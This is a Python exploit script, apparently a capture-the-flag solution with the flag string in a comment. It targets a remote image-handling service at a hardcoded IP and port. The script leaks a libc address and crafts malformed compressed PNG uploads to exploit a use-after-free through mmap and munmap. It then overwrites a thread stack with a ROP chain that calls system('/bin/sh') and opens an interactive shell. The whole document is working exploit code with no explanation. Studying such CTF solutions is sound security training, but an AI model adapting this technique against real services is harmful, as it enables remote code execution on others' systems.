from pwnlib import *
import zlib

# flag{M3ybe_Th1s_1s_d1ffer3nt_UAF_Y0U_F1rst_S33n}



def make_png_header(width, height):
	png  = "\x89PNG\x0d\x0a\x1a\x0a" + "XXXX"
	png += "IHDR"
	png += struct.pack(">I", width) # width
	png += struct.pack(">I", height) # height
	png += "\x08"  # bit depth
	png += "\x02"  # color type
	png += "\x00"  # compression method
	png += "\x00"  # filter method
	png += "\x00"  # interlace method
	return png

# idat_size is the size with which we munmap
# width*height is the size with which we mmap
def make_png(idat_size, width=10, height=10):
	assert idat_size <= 0x1E00000
	png  = make_png_header(width, height)

	png += "AAAA"
	png += struct.pack(">I", idat_size)
	png += "IDAT"
	png += "X"*idat_size

	png += "BBBB"
	png += struct.pack(">I", 0)
	png += "IEND"

	png += "0"*100
	return png

spray_png = make_png(0x10000)





#s = Socket(("localhost", 6767))
s = Socket(("202.120.7.216", 12345))


def leak():
	s.send("1\n")
	s.ru("am name : ")
	s.send("AAAAAAAABBBBBBBB\n")
	s.ru("r count : ")
	s.send("0\n")
	s.ru("AAAAAAAABBBBBBBB\n")
	leaked = "\x00" + s.ru(" , enjoy y")
	s.ru("itor File\n")
	leaked = uq(leaked.ljust(8, '\0'))
	return leaked

def upload_png(png):
	s.send("2\n")
	compressed = zlib.compress(png)
	s.send(pd(len(compressed)) + compressed)
	s.ru("itor File\n")

def start_reminder():
	s.send("6\n")
	s.ru("emind you\n")

def delete(n):
	s.send("4\n")
	s.ru(" delete ?\n")
	s.send("%d\n" % n)
	s.ru("itor File\n")


start_reminder()
leaked = leak()
print "leaked: 0x%x" % leaked

system = leaked + 0x1e45c90     - 0x45390  + 0x41490
bin_sh = leaked + 0x1f8ca77		- 0x18c177 + 1455080




raw_input("> ")

# mmap a little
png = make_png(0x8fff00, 1, 0x100000)
upload_png(png)

# munmap a lot
delete(0)



payload  = "A"*31
payload += pq(0x60e570)
payload += pq(0x60e570)
payload += "B"*0x10
payload += pq(0x40103b) # print stuff
payload += pq(0x409523)
payload += pq(bin_sh)
payload += pq(system)
payload += pattern(0x140 - len(payload))


assert len(payload) == 0x140

# overwrite thread stack
idat_size = 0x100000
png  = make_png_header(1, 0x100000)
png += "AAAA"
png += struct.pack(">I", idat_size)
png += "IDAT"
png += "X"*(idat_size - 0x140)
png += payload
png += "BBBB"
png += struct.pack(">I", 0)
png += "IEND"
png += "0"*100

upload_png(png)





s.interact()
